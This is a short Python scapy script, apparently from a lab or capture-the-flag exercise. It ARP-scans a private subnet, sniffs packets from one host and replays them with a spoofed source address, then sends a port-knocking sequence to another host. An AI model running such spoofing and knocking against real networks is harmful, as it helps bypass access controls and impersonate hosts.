#!/usr/bin/python

# https://gist.github.com/snj/9382c63ad49050e1b9ba

from scapy.all import *
import time

def knock(ports):
    print "[*] Knocking on ports "+str(ports)
    for dport in range(0, len(ports)):
        ip = IP(dst = "10.5.0.6")
        SYN = ip/TCP(dport=ports[dport], flags="S", window=14600, options=[('MSS',1460)])
        send(SYN)


ans, uname = srp(Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst="10.5.0.0/24"), iface="tap0", timeout=2)

pcap = sniff(iface='tap0', filter = 'tcp and src 10.5.0.4',count=20)

for packet in pcap:
    packet[IP].src = "10.5.0.1"
    sendp(packet, iface='tap0')


ports = [951,951,4826,443,100,21]

knock(ports)


